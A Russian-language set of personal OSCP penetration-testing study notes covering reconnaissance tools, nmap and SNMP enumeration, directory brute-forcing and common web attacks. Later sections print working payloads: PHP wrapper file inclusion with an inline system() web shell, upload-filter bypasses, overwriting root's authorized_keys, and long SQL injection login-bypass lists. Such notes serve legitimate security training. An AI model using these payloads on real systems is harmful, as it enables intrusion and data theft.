<p align="center">
  <img width="300" height="300" src="https://raw.githubusercontent.com/0xsyr0/OSCP/a6b834ac1cfee81b38c13560e6018ce3a2f42809/images/kali-linux.svg">
</p>
## OSCP чек лист
---> https://github.com/0xsyr0/OSCP

---

<p align="center">
  <img width="300" height="300" src="https://raw.githubusercontent.com/Kitsun3Sec/Pentest-Cheat-Sheets/master/CheatSheets/28533648.png">
</p>
## Pentest-Cheat-Sheets
В этом репо собраны полезные скрипты и команды, которые помогут для пентеста! Это репо также поможет тем, кто пытается получить OSCP. Вы найдете множество способов сделать что-то без Metasploit Framework.
---> https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets


---

## Стокгольмский синдром: тщательное сетевое тестирование
<p align="center">
  <img width="600" height="300" src="https://blog.exploit.org/content/images/size/w1200/2024/07/SZA00153.png">
</p>
При пентестировании сетей важна осторожность, важно выполнить анализ безопасности таким образом, чтобы не нарушить работу инфраструктуры заказчика. В этой статье я расскажу об аспектах, которые необходимо учитывать для надежного анализа безопасности.

[Above](https://www.kali.org/tools/above/) - Этот пакет содержит невидимый сниффер протоколов для поиска уязвимостей в сети, предназначенный для пентестеров и специалистов по безопасности.

| # Services Table      | Port                           | # Sniffing Table         | Multicast Address, Port, or EtherType |
| :-------------------- | :----------------------------- | ------------------------ | ------------------------------------- |
| `VNC`                 | `TCP/5900, TCP/5901, TCP/5902` | `CDP`                    | `01:00:0C:CC:CC:CC, SNAP: 0x2000`     |
| `RADIUS`              | `UDP/1812, UDP/1813`           | `DTP`                    | `01:00:0C:CC:CC:CC, SNAP: 0x2004`     |
| `TACACS+`             | `TCP/49`                       | `VTP`                    | `01:00:0C:CC:CC:CC, SNAP: 0x2003`     |
| `SSH`                 | `TCP/22`                       | `PVST`                   | `01:00:0C:CC:CC:CC, SNAP: 0x010B`     |
| `RDP`                 | `TCP/3389`                     | `LLDP`                   | `01:80:C2:00:00:0E`                   |
| `Cisco Smart Install` | `TCP/4786`                     | `EDP`                    | `00:E0:2B:00:00:00`                   |
| `WinRM`               | `TCP/5985`                     | `ESRP`                   | `00:E0:2B:00:00:02`                   |
| `Kerberos`            | `TCP/88, UDP/88`               | `MACSec`                 | `0x88E5`                              |
| `SMB`                 | `TCP/445`                      | `ARP`                    | `0x0806`                              |
| `HTTP`                | `TCP/80`                       | `802.1Q`                 | `0x8100`                              |
| `HTTPS`               | `TCP/443`                      | `802.1X`                 | `0x888E`                              |
| `RPC`                 | `TCP/135`                      | `STP`                    | `01:80:C2:00:00:00`                   |
| `SNMP`                | `UDP/161`                      | `OSPF`                   | `224.0.0.5`                           |
| `RTSP`                | `TCP/554`                      | `EIGRP`                  | `224.0.0.10`                          |
| `IPMI`                | `TCP/623, UDP/623`             | `HSRP`                   | `224.0.0.2, UDP/1985`                 |
| `SIP`                 | `TCP/5060, UDP/5060`           | `HSRPv2`                 | `224.0.0.102, UDP/1985`               |
| `FTP`                 | `TCP/21`                       | `GLBP`                   | `224.0.0.102, UDP/3222`               |
| `MySQL`               | `TCP/3306`                     | `VRRP`                   | `224.0.0.18`                          |
| `MSSQL`               | `TCP/1433`                     | `LLMNR`                  | `UDP/5355`                            |
| `PostgreSQL`          | `TCP/5432`                     | `NetBIOS (Name Service)` | `UDP/137`                             |
| `Zebra Routing`       | `TCP/2601`                     | `mDNS`                   | `UDP/5353`                            |
| `Winbox`              | `TCP/8291`                     | `DHCP`                   | `UDP/67, UDP/68`                      |
| `Winbox API`          | `TCP/8728`                     | `DHCPv6`                 | `UDP/546, UDP/547`                    |
| `Winbox API SSL`      | `TCP/8729`                     | `MNDP`                   | `UDP/5678`                            |
| `Telnet`              | `TCP/23`                       | `SSDP`                   | `UDP/1900`                            |
| `FINS`                | `TCP/9600, UDP/9600`           |                          |                                       |
| `CIP`                 | `TCP/44818, UDP/2222`          |                          |                                       |
| `ModbusTCP`           | `TCP/502`                      |                          |                                       |
| `S7Comm`              | `TCP/102`                      |                          |                                       |
| `LDAP`                | `TCP/389`                      |                          |                                       |
| `Syslog`              | `UDP/514`                      |                          |                                       |
| `TFTP`                | `UDP/69`                       |                          |                                       |
| `NFS`                 | `TCP/2049`                     |                          |                                       |
| `STUN`                | `UDP/3478`                     |                          |                                       |
| `NetBIOS`             | `TCP/137, TCP/138, TCP/139`    |                          |                                       |
| `OpenVPN`             | `TCP/1194, UDP/1194`           |                          |                                       |
| `Zabbix`              | `TCP/10050, TCP/10051`         |                          |                                       |
---> https://blog.exploit.org/caster-stockholm-syndrome/

---
# ЗАМЕТКИ! 
> [!Warning]
> Это просто мои заметки и не более!

[hash-identifier](https://www.kali.org/tools/hash-identifier/) - программа для определения различных типов хэшей, используемых для шифрования данных и особенно паролей.

https://www.revshells.com/ - Reverse Shell Generator

# 5 Report Writing for Penetration Testers

> [!Note]
Несмотря на то, что результаты нашей оценки часто непредсказуемы, часто рекомендуется определить детальный объем работ во время предварительных встреч с заказчиком. Этот процесс особенно полезен при определении приоритетов критически важных для бизнеса целей в крупных сетях.

1. [CherryTree](https://www.kali.org/tools/cherrytree/)
2. [Obsidian](https://obsidian.md/)
3. LibreOffice
4. OnlyOffice
- Скриншоты являются важной частью создания заметок и технических отчетов. (Flameshot)
- https://excalidraw.com/ - это виртуальная доска для совместной работы, которая позволяет легко создавать эскизы диаграмм, напоминающие нарисованные от руки.

# 6 Information Gathering

Типичный тест на проникновение состоит из следующих этапов:
• Определение области применения
• Сбор информации
• Обнаружение уязвимостей
• Первоначальная точка опоры
• Повышение привилегий
• Горизонтальное перемещение
• Отчетность/Анализ
• Извлеченные уроки/Исправление
### **Пассивный сбор информации:**
• whois
• Google Hacking / [Google Hacking Database (GHDB)](https://www.exploit-db.com/google-hacking-database)
• [searchdns.netcraft.com](https://searchdns.netcraft.com/)
• [Gitleaks](https://www.kali.org/tools/gitleaks/)
• Shodan и аналоги

### **Активный сбор информации**

> [!Note]
Пожалуйста, обратите внимание, что сканирование портов не соответствует традиционным действиям пользователей и в некоторых юрисдикциях может считаться незаконным. Поэтому его не следует выполнять за пределами лабораторий без прямого письменного разрешения владельца целевой сети.

• nslookup
• host + [seclists](https://www.kali.org/tools/seclists/) (`sudo apt install seclists`) - `/usr/share/seclists`
• [dnsrecon](https://www.kali.org/tools/dnsrecon/) / [dnsenum](https://www.kali.org/tools/dnsenum/)

• [Nmap](https://www.kali.org/tools/nmap/)/ [masscan](https://www.kali.org/tools/masscan/)
> [!Note]
Системные администраторы могут изменять баннеры и намеренно указывать на поддельные названия сервисов, чтобы ввести в заблуждение потенциальных злоумышленников.

Чтобы просмотреть дополнительную информацию о скрипте, мы можем использовать опцию `--script-help`, которая отображает описание скрипта и т.д.  Nmap также предлагает множество полезных скриптов NSE, которые мы можем использовать для обнаружения и перечисления служб SMB.
```bash
ls -1 /usr/share/nmap/scripts/smb*
```

• [nbtscan](https://www.kali.org/tools/nbtscan/) - инструменты для конкретной идентификации информации NetBIOS.

**6.3.6 Перечисление SNMP**
> [!Note]
На протяжении многих лет мы часто сталкивались с тем, что многие сетевые администраторы плохо понимают простой протокол сетевого управления (SNMP). Это часто приводит к неправильной настройке SNMP, что может привести к значительным утечкам информации.

• [onesixtyone](https://www.kali.org/tools/onesixtyone/) - это простой SNMP-сканер, который отправляет SNMP-запросы на получение значения sysDescr асинхронно с настраиваемым пользователем временем отправки, а затем регистрирует ответы, в которых содержится описание программного обеспечения, запущенного на устройстве.

• Мы можем проверять и запрашивать значения SNMP с помощью такого инструмента, как [snmpwalk](https://www.kali.org/tools/net-snmp/#snmpwalk), при условии, что мы знаем строку сообщества SNMP, доступную только для чтения, которая в большинстве случаев является “общедоступной”.
```bash
snmpwalk -c public -v1 <RHOST>
snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public <RHOST> .1
snmpwalk -v2c -c public <RHOST> nsExtendObjects
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 <RHOST> .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 <RHOST> 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
```

# 7 Vulnerability Scanning

• Nessus

**7.3 Проверка уязвимостей с помощью Nmap**

> [!Note]
Скрипт NSE может иметь несколько категорий. Например, он может быть классифицирован как safe и vuln или как intrusive и vuln. Сценарии, отнесенные к категории “safe”, потенциально не влияют на стабильность, в то время как сценарии, отнесенные к категории “intrusive”, могут привести к сбою в работе целевой службы или системы.

Путь скриптов: `/usr/share/nmap/scripts/`
Главный файл: `script.db`
Для получения списка скриптов в категории vuln.
```bash
cat script.db | grep "\"vuln\""
```

Еще вариант:
```bash
ls -lh /usr/share/nmap/scripts/*ssh*
```
Эта команда выводит список всех NSE-скриптов, связанных с SSH-протоколом, расположенных в стандартной директории Nmap.

Еще вариант:
```bash
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
```
1. `locate -r '\.nse$'`: Команда `locate` используется для поиска файлов по их имени. Ключ `-r` включает регулярные выражения, а `'\.nse$'` ищет файлы, заканчивающиеся на ".nse".
2. `| xargs grep categories`: Оператор `|` (конвейер) передает результат предыдущей команды в `grep`, который ищет строки, содержащие слово "categories".
3. `| grep categories`: Второй раз `grep` ищет строки, содержащие слово "categories", чтобы найти все упоминания категорий.
4. `| grep 'default\|version\|safe'`: Третий `grep` ищет строки, содержащие слова "default", "version" или "safe", чтобы найти информацию о версиях и безопасности скриптов.
5. `| grep smb`: Четвертый `grep` ищет строки, содержащие "smb", чтобы сузить поиск до скриптов, относящихся к протоколу SMB.
В результате эта команда выводит информацию о категориях, версиях и безопасности Nmap-скриптов, связанных с протоколом SMB.

Скрипт `vuln` в nmap:
```bash
sudo nmap -sV --script vuln <RHOST>
```
Сам скрипт имеет категории safe, vuln и external.

Поиск в поисковике скриптов NSE, например: `CVE-2024-***** nse`
Находим и скачиваем. 

Одним из первых результатов поиска является ссылка на страницу GitHub, которая предоставляет скрипт для проверки этой уязвимости. Давайте загрузим этот скрипт и сохраним его как `/usr/share/nmap/scripts/http-vuln-cve2024-****.nse`, чтобы соответствовать синтаксису именования других скриптов `NSE`. Прежде чем мы сможем использовать скрипт, нам нужно обновить `script.db` с помощью `--script-updatedb`.

Обновление списка скриптов:
```bash
sudo nmap --script-updatedb
```

> [!Error]
Мы также должны иметь в виду, что скрипт NSE может содержать вредоносный код, который предоставляет злоумышленнику полный доступ к нашей системе. По этой причине нам всегда необходимо проверять, что скрипт NSE не только обеспечивает необходимую функциональность, но и безопасен.
>
Для тех скриптов, которые были скачаны из неизвестного источника!

```bash
sudo nmap -A -T4 -sC -sV -p- <RHOST>
```
- `-A` - включает расширенное сканирование, которое выполняет определение версии, скрипты и определение операционной системы.
- `-T4` - устанавливает темп сканирования на "агрессивный", что ускоряет процесс, но может быть заметен для целевого устройства.
- `-sC` - использует скрипты nmap для более глубокого анализа открытых портов и служб.
- `-sV` - определяет версии служб, работающих на открытых портах.
- `-p-` - сканирует все 65535 портов на целевом устройстве, а не только наиболее распространенные.

```bash
sudo nmap -sV -sU <RHOST>
```
- `-sV` - определяет версии служб, работающих на открытых портах. Это помогает получить более подробную информацию о работающем программном обеспечении на целевом хосте.
- `-sU` - выполняет сканирование UDP-портов. В отличие от TCP-портов, UDP-порты не требуют установления соединения, поэтому их сканирование может выявить дополнительные открытые службы.

```bash
sudo nmap -A -T4 -p- -sS -sV -oN output.txt --script discovery <RHOST>
```
- `-A` - включает расширенное сканирование, которое выполняет определение версии, скрипты и определение операционной системы.
- `-T4` - устанавливает темп сканирования на "агрессивный", что ускоряет процесс, но может быть заметен для целевого устройства.
- `-p-` - сканирует все 65535 портов на целевом устройстве, а не только наиболее распространенные.
- `-sS` - использует TCP SYN-сканирование, которое является более скрытным и быстрым, чем полное TCP-сканирование.
- `-sV` - определяет версии служб, работающих на открытых портах.
- `-oN output.txt` - сохраняет результаты сканирования в файл с именем "output.txt".
- `--script discovery` - запускает набор скриптов Nmap, которые выполняют дополнительные проверки и сбор информации об удаленном хосте.

```bash
sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>
```
- `-sC` - использует скрипты nmap для более глубокого анализа открытых портов и служб.
- `-sV` - определяет версии служб, работающих на открытых портах.
- `-p-` - сканирует все 65535 портов на целевом устройстве, а не только наиболее распространенные.
- `--scan-delay 5s` - устанавливает задержку в 5 секунд между каждым пакетом сканирования. Это может помочь избежать обнаружения или блокировки сканирования целевым устройством.

# 8 Introduction to Web Application Attacks

Захват баннера веб-сервера, мы уже знаем, что есть порт 80.
```bash
sudo nmap -p 80 -sV <RHOST>
```

Скрипт "http-enum" является частью Nmap Scripting Engine (NSE) и используется для обнаружения веб-серверов и каталогов на целевой системе. Он отправляет серию HTTP-запросов на указанный порт и анализирует ответы для идентификации программного обеспечения веб-сервера, каталогов и других веб-связанной информации.
```bash
sudo nmap -p 80 --script=http-enum <RHOST>
```

• [Wappalyzer](https://www.wappalyzer.com/) - это инструмент для определения технологий, используемых веб-сайтом.

• [Gobuster](https://www.kali.org/tools/gobuster/)- это инструмент, используемый для перебора URIs (каталогов и файлов) на веб-сайтах, DNS-поддоменов (с поддержкой шаблонов), имен виртуальных хостов на целевых веб-серверах, открытия пакетов Amazon S3, Google Cloud buckets и TFTP-серверов.

> [!Note]
Из-за своей грубой принудительной природы Gobuster может генерировать довольно большой трафик, а это означает, что он не будет полезен, когда необходимо оставаться незамеченным.

Gobuster поддерживает различные режимы перечисления, включая фаззинг и dns. Режим `dir`, который перечисляет файлы и каталоги.
```bash
gobuster dir -u 192.101.10.10 -w /usr/share/wordlists/dirb/common.txt -t
5
```

• [wordlists](https://www.kali.org/tools/wordlists/)- покажет пути для ворд листов! 
```bash
root@kali:~# wordlists -h

> wordlists ~ Contains the rockyou wordlist

/usr/share/wordlists
|-- amass -> /usr/share/amass/wordlists
|-- brutespray -> /usr/share/brutespray/wordlist
|-- dirb -> /usr/share/dirb/wordlists
|-- dirbuster -> /usr/share/dirbuster/wordlists
|-- dnsmap.txt -> /usr/share/dnsmap/wordlist_TLAs.txt
|-- fasttrack.txt -> /usr/share/set/src/fasttrack/wordlist.txt
|-- fern-wifi -> /usr/share/fern-wifi-cracker/extras/wordlists
|-- john.lst -> /usr/share/john/password.lst
|-- legion -> /usr/share/legion/wordlists
|-- metasploit -> /usr/share/metasploit-framework/data/wordlists
|-- nmap.lst -> /usr/share/nmap/nselib/data/passwords.lst
|-- rockyou.txt.gz
|-- seclists -> /usr/share/seclists
|-- sqlmap.txt -> /usr/share/sqlmap/data/txt/wordlist.txt
|-- wfuzz -> /usr/share/wfuzz/wordlist
`-- wifite.txt -> /usr/share/dict/wordlist-probable.txt
```

• [Burp Suite](https://www.kali.org/tools/burpsuite/) - Burp Suite - это интегрированная платформа для тестирования безопасности веб-приложений. Различные инструменты, входящие в состав Burp Suite, эффективно взаимодействуют друг с другом, поддерживая весь процесс тестирования, начиная с первоначального отображения и анализа уязвимостей приложения и заканчивая поиском и использованием уязвимостей в системе безопасности.

8.3 Перечисление веб-приложений

• Инструменты разработчика

• **API**
За путями API часто следует номер версии, что приводит к такому шаблону, как:
```bash
/api_name/v1
```

• [Gobuster](https://www.kali.org/tools/gobuster/) (уже был выше)
Запуск:
```bash
gobuster dir -u http://101.101.10.10:8080 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
```

 Команда `gobuster` - это инструмент для brute-forcing каталогов и поддоменов на веб-серверах. Вот разбор команды, которую вы предоставили:
* `dir`: Это указывает, что мы хотим выполнить brute-force каталогов.
* `-u http://101.101.10.10:8080`: Это целевой URL, на котором будет проверяться доступность каталогов.
* `-w /usr/share/wordlists/dirb/big.txt`: Это файл со списком каталогов, который будет использован во время brute-force. В данном случае список каталогов находится в `/usr/share/wordlists/dirb/big.txt`.
* `-p pattern.txt`: Это указывает на файл пользовательской шаблонной строки для каталогов. Файл `pattern.txt` должен содержать список строк, которые будут добавлены к каталогам из списка.

```bash
pattern.txt 

{GOBUSTER}/v1
{GOBUSTER}/v2
```

В сущности, эта команда попытается обнаружить доступные каталоги на веб-сервере `http://101.101.10.10:8080` с помощью каталогов из файла `big.txt` и пользовательской шаблонной строки из `pattern.txt`. В нашем случае это попытка найти API.

> [!Note]
> Возможно!
> Если мы перейдем по пути /ui, то обнаружим всю документацию по API.

Проверим API /users с помощью curl.
```bash
curl -i http://101.101.10.10:8080/users/v1
Тут будет ответ и он может содержать информацию
```

Можем если, что-то найдем попытаться еще брутить:
```bash
gobuster dir -u http://101.101.10.10:8080/users/v1/admin/ -w
/usr/share/wordlists/dirb/small.txt
```
(пример с admin, т.к. есть шанс, что он будет или нет^-^)

• [JS Compress](https://jscompress.com/) - это бесплатный онлайн-инструмент, который позволяет сжимать код на JavaScript. Сжатие кода JavaScript может помочь уменьшить размер веб-страниц, что в свою очередь может помочь улучшить время загрузки вашего веб-сайта.

• Web Application Analysis Scanners

| Name     | URL                                  |
| -------- | ------------------------------------ |
| Ffuf     | https://www.kali.org/tools/ffuf/     |
| Gobuster | https://www.kali.org/tools/gobuster/ |
| Wfuzz    | https://www.kali.org/tools/wfuzz/    |
| WhatWeb  | https://www.kali.org/tools/whatweb/  |
| WPScan   | https://www.kali.org/tools/wpscan/   |

# 9 Common Web Application Attacks

• Directory Traversal
> [!Note]
Количество последовательностей `../` имеет значение только до тех пор, пока мы не доберемся до корневой файловой системы. Теоретически, мы можем добавить столько последовательностей `../`, сколько захотим, поскольку дальше возвращаться некуда. Это может быть полезно в определенных ситуациях, например, когда мы не знаем наш текущий рабочий каталог. В этом случае мы могли бы указать большое количество `../`, чтобы обеспечить доступ к корневой файловой системе с точки зрения относительного пути.

`/etc/passwd` - является текстовым файлом в операционных системах типа Unix, включая Linux. Он содержит информацию об учетных записях пользователей на системе.
`/.ssh/` - скрытая директория в операционных системах типа Unix, включая Linux, которая содержит файлы, связанные с протоколом Secure Shell (SSH).

Для обхода защит и т.д. можно использовать кодировку url и т.д.

> [!warning]
Браузеры часто пытаются проанализировать или оптимизировать элементы для удобства пользователя. При тестировании веб-приложений мы должны в основном использовать такие инструменты, как Burp, cURL.


9.2 Уязвимости, связанные с включением файлов

• Local File Inclusion (LFI)
> [!Note] 
> Уязвимости обхода каталогов для получения содержимого файла за пределами корневого каталога веб-сервера. Уязвимости, связанные с включением файлов, для запуска локальных или удаленных файлов, в то время как обход каталога позволяет нам только прочитать содержимое файла.

[Список полезных полезных нагрузок и обходных путей](https://github.com/swisskyrepo/PayloadsAllTheThings) для Web Application Security и Pentest/CTF `(Много полезной информации)`

• [Netcat](https://www.kali.org/tools/netcat/) - это универсальная сетевая утилита, используемая для чтения из и записи в сетевые соединения с использованием протоколов TCP или UDP. Ее часто называют "швейцарским ножом" сетевых инструментов из-за ее гибкости и широкого спектра возможностей.
```bash
nc -lnvp <LPORT>
```

• PHP Wrappers
> [!Note] 
PHP предоставляет ряд различных потоков ввода-вывода, которые предоставляют доступ к собственным потокам ввода и вывода PHP, стандартным файловым дескрипторам ввода, вывода и ошибок, временным файловым потокам в памяти и на диске, а также фильтрам, которые могут манипулировать другими файловыми ресурсами при чтении из них и записи в них.

PHP Wrappers - это специальные функции, которые позволяют работать с различными протоколами и ресурсами в PHP. Они предоставляют удобный интерфейс для взаимодействия с этими ресурсами, скрывая низкоуровневые детали реализации.

Некоторые из наиболее распространенных PHP Wrappers:
1. **file://** - позволяет работать с локальными файлами на файловой системе.
2. **http://** - позволяет делать HTTP-запросы к удаленным серверам.
3. **ftp://** - позволяет работать с FTP-серверами.
4. **php://** - предоставляет доступ к различным потокам ввода-вывода PHP, таким как stdin, stdout, stderr.
5. **data://** - позволяет использовать встроенные данные в качестве файлов.
6. **glob://** - позволяет получать список файлов, соответствующих заданному шаблону.
7. **phar://** - позволяет работать с PHAR-архивами (PHP Archive).

```bash
curl http://site.com/shop/index.php?page=admin.php
```

```bash
curl http://site.com/shop/index.php?page=php://filter/resource=admin.php
```
Она демонстрирует использование специального PHP-Wrappers `php://filter`, которая позволяет получить содержимое файла, не выполняя его.
- `http://site.com/shop/index.php?page=php://filter/resource=admin.php` - это URL-адрес, к которому будет отправлен HTTP-запрос. Однако, вместо обычного пути к файлу, здесь используется специальная обертка `php://filter/resource=`.
- `php://filter` - это встроенный PHP-Wrappers, которая позволяет применять различные фильтры к входным данным, не выполняя их.
- `resource=admin.php` - указывает, что мы хотим получить содержимое файла `admin.php` без его выполнения.
Это может быть полезно для поиска уязвимостей, отладки или анализа кода.

Давайте теперь закодируем выходные данные с помощью base64, добавив `convert.base64-encode`. Это преобразует указанный ресурс в строку base64.
```bash
curl http://site.com/shop/index.php?page=php://filter/convert.base64-
encode/resource=admin.php
```
(Чтобы получить, точно вывод php-скрипта)

Теперь мы можем использовать программу base64 с флагом -d для декодирования закодированных данных в терминале.
```bash
echo "Закодированное" | base64 -d
```

В то время как `php://filter` wrappers может использоваться для включения содержимого файла, мы можем использовать `data://` wrappers для выполнения кода.
```bash
curl "http://site.com/shop/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```
- `data://text/plain,` - это специальный протокол, который позволяет передавать произвольный текст в качестве содержимого страницы.
- `<?php%20echo%20system('ls');?>` - это PHP-код, который будет выполнен на сервере. Он выводит результат выполнения команды `ls` (список файлов в текущей директории).

Когда брандмауэры веб-приложений или другие механизмы безопасности установлены, они могут фильтровать строки типа “system” или другие элементы PHP-кода. Закодируем фрагмент PHP в base64.

```bash
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
```

Без флага `-n` команда `echo '<?php echo system($_GET["cmd"]);?>'` добавила бы символ новой строки в конце выводимой строки. Это могло бы привести к нежелательным последствиям, например, если эта строка будет использоваться в качестве части URL-адреса или в другом контексте, где лишние символы могут вызвать проблемы.

Использование `-n` позволяет получить чистую строку без дополнительных символов, что делает ее более удобной для дальнейшего использования, например, для передачи в команду `base64`.

Таким образом, флаг `-n` обеспечивает более аккуратный и контролируемый вывод строки, что важно при работе с чувствительными данными, такими как код, который может быть использован для выполнения произвольных системных команд.

```bash
curl "http://site.com/shop/index.php?page=data://text/plain;base64,ЗАКОДИРОВАННОЕ&cmd=ls"
```
Мы можем манипулировать параметром `cmd=` для выполнения команд.
Получили мини web-shell.

> [!warning] 
Однако, что wrapper `data://` не будет работать при установке PHP по умолчанию. Чтобы использовать его, необходимо включить параметр `allow_url_include`

• Remote File Inclusion (RFI)
> [!note] 
Remote File Inclusion (RFI) - это уязвимость в веб-приложениях, которая позволяет злоумышленнику выполнять произвольный код на сервере путем включения удаленного файла в приложение.

• [Webshells](https://www.kali.org/tools/webshells/) - коллекция web шеллов для серверов ASP, ASPX, CFM, JSP, Perl и PHP.

**Веб-шелл** (**веб-оболочка** или **web shell**) — командная оболочка (программа или скрипт для управления устройством с помощью команд) для удаленного управления веб-сервером.

• File Upload Vulnerabilities
 Представляют собой серьезные уязвимости в веб приложениях, которые могут иметь серьезные последствия для безопасности системы. Эти уязвимости возникают, когда веб-приложения не реализуют должным образом проверку и ограничения на загрузку файлов пользователями.

Один из способов обойти этот фильтр - изменить расширение файла на менее часто используемое расширение файла php, такое как `.phps`, `.php7`, `.phar`,`.phtml` и другие. Это может позволить нам обойти простые фильтры.

| Тип файла         | Расширения                                                                                          |
| ----------------- | --------------------------------------------------------------------------------------------------- |
| ASP               | `.asp`, `.aspx`, `.asa`, `.cer`, `.cdx`, `.ashx`, `.asmx`, `.axd`                                   |
| Java Server Pages | `.jsp`, `.jspx`, `.jsw`, `.jsv`                                                                     |
| Perl              | `.cgi`, `.pl`, `.fcgi`, `.fpl`                                                                      |
| Python            | `.py`, `.pyc`, `.pyo`, `.pyd`, `.wsgi`                                                              |
| Ruby              | `.rb`, `.rbw`                                                                                       |
| PHP               | `.php`, `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.pht`, `.phar`, `.php~`, `.php#`, `.php_bak` |
| Серверные HTML    | `.shtml`, `.shtm`, `.stm`                                                                           |
Другой способ обойти фильтр - изменить символы в расширении файла на заглавные. Создание черного списка может быть реализовано путем сравнения расширения загруженного файла со списком строк, содержащих только строчные буквы расширений PHP-файлов.

• Using Non-Executable Files
Это метод эксплуатации уязвимостей загрузки файлов, при котором злоумышленники используют нераспознаваемые или неисполняемые файлы для выполнения вредоносного кода на сервере.

> [!warning] 
При тестировании функциональности загрузки файлов в веб-приложениях, важно обращать внимание на то, что происходит, когда пользователь пытается загрузить файл, который уже существует на сервере. Если веб приложение реагирует на это сообщением о том, что файл уже существует, это может открыть возможности для злоумышленника. Он может использовать этот механизм для перебора и исследования содержимого веб-сервера, пытаясь загружать различные файлы и анализируя ответы системы.

Мы можем попробовать `../../../../../../`, чтобы понять, можем ли мы определять есть такой файл или нет, а может даже перезаписать его.

Можем попробовать перезаписать файл `authorized_keys` в домашнем каталоге для `root`.  Для этого мы создадим пару SSH-ключей с помощью `ssh-keygen`, а также файл с именем `authorized_keys`, содержащий ранее созданный открытый ключ.

`authorized_keys` - это файл, который используется в системах на основе Unix (например, Linux) для аутентификации пользователей с помощью ключей SSH (Secure Shell). Этот файл содержит публичные ключи, которые разрешают пользователям подключаться к системе без необходимости вводить пароль.

После перезаписи файла `root/.ssh/authorized_keys`
Мы можем попытаться подключиться к ssh.

> [!error] 
Чтобы избежать этой ошибок, мы удалим файл `known_hosts` до того, как мы подключаемся к системе. Этот файл содержит все ключи хоста от предыдущих SSH-подключений.
`rm ~/.ssh/known_hosts`

Подключаемся через команду:
```bash
ssh -i файл_с_ключем root@101.101.1.1
```

Мы также можем попробовать перезаписать какой-нибудь файл, чтобы получить `web-shell`, но фильтры могут заблокировать подобные попытки, либо нет.

• Command Injection 
Уязвимость веб-приложений, при которой пользовательский ввод, не прошедший должную проверку и очистку, передается в качестве части команды операционной системы. Это позволяет злоумышленнику выполнять произвольные команды на сервере, что может привести к раскрытию конфиденциальной информации, компрометации системы или другим нежелательным последствиям.

```powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
Фрагмент кода, который отображает "CMD" или "PowerShell" в зависимости от того, где он выполняется.

# 10 SQL Injection Attacks

SQL Injection - это уязвимость в приложениях, использующих SQL для взаимодействия с базой данных, при которой злоумышленник может вставлять произвольный SQL-код в запросы приложения, чтобы получить несанкционированный доступ к данным, изменить или удалить их, а также выполнить другие вредоносные действия на сервере базы данных.

| Name                     | URL                                                               |
| ------------------------ | ----------------------------------------------------------------- |
| SQL Injection Cheatsheet | https://tib3rius.com/sqli.html                                    |
| impacket-mssqlclient     | https://www.kali.org/tools/impacket-scripts/#impacket-mssqlclient |
| Sqlmap                   | https://www.kali.org/tools/sqlmap/                                |

Master List
```
';#---              // insert everywhere! Shoutout to xsudoxx!
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

Authentication Bypass
```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

• [Sqlmap](https://www.kali.org/tools/sqlmap/)
